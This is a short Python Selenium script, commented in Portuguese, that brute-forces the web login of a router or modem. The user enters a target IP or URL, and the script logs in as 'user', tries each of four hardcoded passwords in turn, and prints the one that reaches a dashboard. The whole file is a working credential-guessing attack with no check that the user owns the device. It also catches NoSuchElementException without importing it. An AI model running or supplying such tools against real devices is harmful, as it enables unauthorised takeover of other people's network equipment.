from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

import time

chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

def get_user_input():
    ip = input("Digite o IP ou URL do modem: ")
    return ip

ip = get_user_input()

# Lista de senhas para testar
senhas = ['Arroz123','Batata123','Feijao123','Furia123']

servico = Service(ChromeDriverManager().install())
navegador = webdriver.Chrome(service=servico,options=chrome_options)

# Pagina de Login - URL ou IP
navegador.get(f'http://{ip}')

# Localiza o campo usuario e insere o usuario user
usuario_input = navegador.find_element('xpath',
                        '/html/body/form[1]/div/div[2]/div[2]/input').send_keys("user")

# Localiza o botado de Login
navegador.find_element('xpath',
                        '//*[@id="div1"]/input')

# Localiza o campo password
senha_input = navegador.find_element('xpath',
                        '//*[@id="div1"]/div[4]/input')

for senha in senhas:
    try:
        # Limpe o campo de senha e insira a senha atual
        senha_input.clear()
        senha_input.send_keys(senha)

        # Clique no botao de Login
        login_button = navegador.find_element('xpath',
                               '//*[@id="div1"]/input').click()

        # Aguarde um momento para verificar se o login foi bem sucedido
        time.sleep(4)

        # Verifique se voce esta logado ou se ha uma mensagem de erro
        if 'dashboard' in navegador.current_url:
            print(f'Senha correta {senha}')
            break

        else:
            # Verifique a presenca da mensagem de erro por XPath
            try:
                error_element = navegador.find_element('xpath',
                                                                   '/html/body/blockquote/form/table/tbody/tr[2]/td/input')
                # print(f'Senha incorreta: {senha}')
                # Clique no botao OK para fechar a mensagem
                navegador.find_element('xpath',
                                       '/html/body/blockquote/form/table/tbody/tr[2]/td/input').click()
            except NoSuchElementException:
                pass # Nenhum elemento encontrado, continue com o proximo teste de senha
    except Exception as e:
        print(f'Ocorreu um erro: {str(e)}')

# Created by Mozart
